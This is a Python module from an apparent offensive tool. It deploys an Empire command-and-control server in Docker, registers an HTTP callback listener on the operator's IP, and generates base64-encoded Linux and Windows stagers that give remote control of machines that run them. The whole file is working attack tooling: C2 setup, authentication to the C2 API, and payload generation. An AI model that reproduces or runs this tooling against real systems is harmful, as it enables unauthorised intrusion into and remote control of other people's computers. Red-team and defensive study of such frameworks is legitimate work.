import docker
import os
import subprocess
import requests
import json
import base64
from time import sleep
import urllib3
import sys
import more_itertools
import getpass
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def c2(LOCAL_IP) -> None | str:
    check_docker()
    is_up = False
    client = docker.from_env()

    for i in range(len(client.containers.list(all))):
        container = client.containers.get(client.containers.list(all)[i].__getattribute__('short_id'))
        if "empire" in container.attrs['Config']['Image']:
            print('[+] Detected an existing C2 container')
            is_up = True
            client.containers.list(all)[i].start()
            for c in more_itertools.ncycles(['|', '/', '-', '\\'], 100):
                logs = '   ' + str(container.logs(tail=1).decode('utf-8'))
                sys.stdout.write('\033[2K\r[+] Starting the Docker... ' + c)
                if "WARNING: your terminal doesn't support" not in logs:
                    sys.stdout.write((logs.replace('\r', '')).replace('\n', ''))
                sys.stdout.flush()
                sleep(0.1)
                if 'Plugin csharpserver ran successfully!' in container.logs(tail=3).decode('utf-8'):
                    print('\n[+] C2 started successfully from existing docker (ID: {0})'.format(client.containers.list(all)[i].short_id))
                    break
            print('[+] Listening on port 8888 (CLIHTTP)')
            while True:
                passc2 = password(True)
                token = c2_token(passc2)
                if token == False:
                    print('[-] Wrong password. Please try again.')
                else:
                    break
            return client.containers.list(all)[i].short_id, token
    if not is_up:
        infos = deploy_c2(LOCAL_IP)
        return infos

def password(status):
    if status == True:
        print('[+] Username to access the C2 : empireadmin')
        password = getpass.getpass('[!] Enter your password to access the C2 : ')
    else:
        while True:
            print('[+] Username to access the C2 : empireadmin')
            password = getpass.getpass('[!] Create a password to access the C2 : ')
            confirm_password = getpass.getpass('[!] Confirm the password : ')
            if password == confirm_password:
                break
            else:
                print('[!] Passwords do not match. Try again please.')
    return password

def check_docker():
    res_docker = subprocess.check_output('which docker', shell=True, universal_newlines=True)
    if 'docker' not in res_docker:
        print('[-] Docker is not installed on your system. Please intall it from https://docs.docker.com')
        exit
    res_group = subprocess.check_output('id -nG "$(whoami)" | grep -qw "docker" && echo 1 || echo 0 && id -nG "$(whoami)" | grep -qw "root" && echo 1 || echo 0', shell=True, universal_newlines=True)
    if '1' not in res_group:
        print('[-] Your current user is not part of the docker group. Add it or start ip2root with a user that is part of the docker group.')
        exit()

def starkiller():
    STARKILLER_PATH = '/tmp/starkiller'
    if not os.path.exists(STARKILLER_PATH):
        STARKILLER_URL = 'https://github.com/BC-SECURITY/Starkiller/releases/download/v1.10.0/starkiller-1.10.0.AppImage'
        print('[+] Downloading starkiller in {} from {}'.format(STARKILLER_PATH, STARKILLER_URL))
        r_github = requests.get(STARKILLER_URL, allow_redirects=True)
        open(STARKILLER_PATH, 'wb').write(r_github.content)
    subprocess.Popen(["chmod", "+x", STARKILLER_PATH])
    subprocess.Popen([STARKILLER_PATH])

def deploy_c2(LOCAL_IP):
    print('[+] Deploying C2 container')
    passc2 = password(False)
    C2_LISTENER_PORT = 8888
    client = docker.from_env()
    container = client.containers.run(image='bcsecurity/empire:latest', ports={'1337/tcp':1337, '5000/tcp':5000, '{}/tcp'.format(C2_LISTENER_PORT):C2_LISTENER_PORT}, name='empire', tty=True, detach=True)
    for c in more_itertools.ncycles(['|', '/', '-', '\\'], 100):
        logs = '   ' + str(container.logs(tail=1).decode('utf-8'))
        sys.stdout.write('\033[2K\r[+] Starting the Docker... ' + c)
        sys.stdout.write((logs.replace('\r', '').replace('\n', '')))
        sys.stdout.flush()
        sleep(0.1)
        if 'Plugin csharpserver ran successfully!' in logs:
            print('\n[+] C2 created successfully')
            break
    container.exec_run("./ps-empire server --username empireadmin --password '{0}'".format(passc2))
    token = c2_token(passc2)
    c2_listener(token, LOCAL_IP)
    print('[+] C2 container created successfully (Docker ID : {0})'.format(container.short_id))
    print('[+] Listener created on port {} (CLIHTTP)'.format(C2_LISTENER_PORT))
    return container.short_id, token

def c2_token(password):
    try:
        url_c2 = 'https://localhost:1337/api/admin/login'
        headers = {"Content-Type": "application/json"}
        param = {"username":"empireadmin", "password":"{0}".format(password)}
        r_c2 = requests.post(url_c2, headers=headers, json=param, verify=False)
        json_token = json.loads(r_c2.text)
        token = json_token['token']
        return token
    except:
        return False
    

def c2_listener(token, LOCAL_IP):
    url_listener = 'https://localhost:1337/api/listeners/http?token={0}'.format(str(token))
    param_listener = {"Name":"CLIHTTP", "Port":"8888", "Host":"{0}".format(LOCAL_IP)}
    headers = {"Content-Type": "application/json"}
    requests.post(url_listener, headers=headers, json=param_listener, verify=False)

def get_stager(system, token):
    if system == 'linux':
        system = 'multi/bash'
    elif system == 'windows':
        system = 'multi/launcher'
    else:
        return "Error: OS not defined."
    url_stager = 'https://localhost:1337/api/stagers?token={0}'.format(token)
    param_stager = {"StagerName":"{0}".format(system), "Listener":"CLIHTTP"}
    headers_stager = {"Content-Type": "application/json"}
    r_stager = requests.post(url_stager, headers=headers_stager, json=param_stager, verify=False)
    payload = json.loads(r_stager.text)
    payload = payload[system]['Output']
    message_bytes = payload.encode('ascii')
    rs_b64 = base64.b64encode(message_bytes)

    return rs_b64
